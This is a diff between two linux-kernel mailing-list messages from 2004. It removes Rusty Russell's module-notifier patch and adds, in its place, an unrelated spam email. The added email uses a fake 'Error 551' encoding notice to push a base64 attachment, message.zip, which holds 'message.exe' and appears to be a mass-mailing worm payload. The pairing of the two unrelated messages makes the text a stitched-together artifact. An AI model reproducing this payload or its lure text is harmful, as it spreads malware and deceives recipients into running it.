@@ -1,120 +1,104 @@
 Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S265461AbUA1A5y (ORCPT <rfc822;willy@w.ods.org>);
-	Tue, 27 Jan 2004 19:57:54 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S265709AbUA1A5w
+	id S261464AbUA1Bas (ORCPT <rfc822;willy@w.ods.org>);
+	Tue, 27 Jan 2004 20:30:48 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S265709AbUA1Bas
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Tue, 27 Jan 2004 19:57:52 -0500
-Received: from dp.samba.org ([66.70.73.150]:49581 "EHLO lists.samba.org")
-	by vger.kernel.org with ESMTP id S265461AbUA1A5q (ORCPT
+	Tue, 27 Jan 2004 20:30:48 -0500
+Received: from [218.80.81.143] ([218.80.81.143]:48646 "HELO compuserve.com")
+	by vger.kernel.org with SMTP id S261464AbUA1Bap (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 27 Jan 2004 19:57:46 -0500
-From: Rusty Russell <rusty@rustcorp.com.au>
-To: Alan Stern <stern@rowland.harvard.edu>
-Cc: Greg KH <greg@kroah.com>, torvalds@osdl.org, linux-kernel@vger.kernel.org,
-       mochel@digitalimplant.org
-Subject: Re: PATCH: (as177) Add class_device_unregister_wait() and platform_device_unregister_wait() to the driver model core 
-In-reply-to: Your message of "Mon, 26 Jan 2004 10:51:14 CDT."
-             <Pine.LNX.4.44L0.0401261016530.822-100000@ida.rowland.org> 
-Date: Wed, 28 Jan 2004 09:55:04 +1100
-Message-Id: <20040128005801.403242C069@lists.samba.org>
+	Tue, 27 Jan 2004 20:30:45 -0500
+Date: Wed, 28 Jan 2004 01:29:54 +0000
+From: XkXmXLXFXcX@debianplanet.org
+Subject: I still love you  LUbza
+To: Linux-kernel <linux-kernel@vger.kernel.org>
+References: <2EH264D9H9K0FL55@vger.kernel.org>
+In-Reply-To: <2EH264D9H9K0FL55@vger.kernel.org>
+Message-ID: <ECF7EF98H42LECBG@debianplanet.org>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_6_L4F1DCFK4IKEF90A498JL28"
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-In message <Pine.LNX.4.44L0.0401261016530.822-100000@ida.rowland.org> you write:
-> Create a new module entry point, the module_unreg routine.  For all
-> existing modules this entry point would be undefined and hence not used.  
+------=_NextPart_6_L4F1DCFK4IKEF90A498JL28
+Content-Type: text/plain
+Content-Transfer-Encoding: 8bit
 
-Just use the notifier, which already exists, just needs a few more
-points.
+Error 551: We are sorry your UTF-8 encoding is not supported by the server, so the text was automatically zipped and attached to this message.
 
-Cheers!
-Rusty.
---
-  Anyone who quotes me in their sig is an idiot. -- Rusty Russell.
+------=_NextPart_6_L4F1DCFK4IKEF90A498JL28
+Content-Type: text/plain; name="message.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="message.zip"
+Content-ID: <message.zip>
 
-Name: More Module Notifiers
-Author: Rusty Russell
-Status: Trivial
+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
 
-D: Put in the rest of the module notifiers, esp. one when a module is being
-D: removed.
+------=_NextPart_6_L4F1DCFK4IKEF90A498JL28--
 
-diff -urpN --exclude TAGS -X /home/rusty/devel/kernel/kernel-patches/current-dontdiff --minimal linux-2.6.0-test5-bk2/include/linux/module.h working-2.6.0-test5-bk2-nat-expect/include/linux/module.h
---- linux-2.6.0-test5-bk2/include/linux/module.h	2003-07-31 01:50:19.000000000 +1000
-+++ working-2.6.0-test5-bk2-nat-expect/include/linux/module.h	2003-09-21 15:24:09.000000000 +1000
-@@ -180,6 +180,7 @@ enum module_state
- 	MODULE_STATE_LIVE,
- 	MODULE_STATE_COMING,
- 	MODULE_STATE_GOING,
-+	MODULE_STATE_GONE, /* Only for notifier: module about to be freed */
- };
- 
- struct module
-diff -urpN --exclude TAGS -X /home/rusty/devel/kernel/kernel-patches/current-dontdiff --minimal linux-2.6.0-test5-bk2/kernel/module.c working-2.6.0-test5-bk2-nat-expect/kernel/module.c
---- linux-2.6.0-test5-bk2/kernel/module.c	2003-09-09 10:35:05.000000000 +1000
-+++ working-2.6.0-test5-bk2-nat-expect/kernel/module.c	2003-09-21 15:22:36.000000000 +1000
-@@ -83,6 +83,13 @@ int unregister_module_notifier(struct no
- }
- EXPORT_SYMBOL(unregister_module_notifier);
- 
-+static void module_notify(struct module *mod, enum module_state state)
-+{
-+	down(&notify_mutex);
-+	notifier_call_chain(&module_notify_list, state, mod);
-+	up(&notify_mutex);
-+}
-+
- /* We require a truly strong try_module_get() */
- static inline int strong_try_module_get(struct module *mod)
- {
-@@ -723,12 +730,15 @@ sys_delete_module(const char __user *nam
- 	mod->state = MODULE_STATE_GOING;
- 	restart_refcounts();
- 
-+	module_notify(mod, MODULE_STATE_GOING);
-+
- 	/* Never wait if forced. */
- 	if (!forced && module_refcount(mod) != 0)
- 		wait_for_zero_refcount(mod);
- 
- 	/* Final destruction now noone is using it. */
- 	mod->exit();
-+	module_notify(mod, MODULE_STATE_GONE);
- 	free_module(mod);
- 
-  out:
-@@ -1718,9 +1728,7 @@ sys_init_module(void __user *umod,
- 	/* Drop lock so they can recurse */
- 	up(&module_mutex);
- 
--	down(&notify_mutex);
--	notifier_call_chain(&module_notify_list, MODULE_STATE_COMING, mod);
--	up(&notify_mutex);
-+	module_notify(mod, MODULE_STATE_COMING);
- 
- 	/* Start the module */
- 	ret = mod->init();
-@@ -1728,12 +1736,14 @@ sys_init_module(void __user *umod,
- 		/* Init routine failed: abort.  Try to protect us from
-                    buggy refcounters. */
- 		mod->state = MODULE_STATE_GOING;
-+		module_notify(mod, MODULE_STATE_GOING);
- 		synchronize_kernel();
- 		if (mod->unsafe)
- 			printk(KERN_ERR "%s: module is now stuck!\n",
- 			       mod->name);
- 		else {
- 			module_put(mod);
-+			module_notify(mod, MODULE_STATE_GONE);
- 			down(&module_mutex);
- 			free_module(mod);
- 			up(&module_mutex);
-@@ -1751,6 +1761,7 @@ sys_init_module(void __user *umod,
- 	mod->init_size = 0;
- 	mod->init_text_size = 0;
- 	up(&module_mutex);
-+	module_notify(mod, MODULE_STATE_LIVE);
- 
- 	return 0;
- }
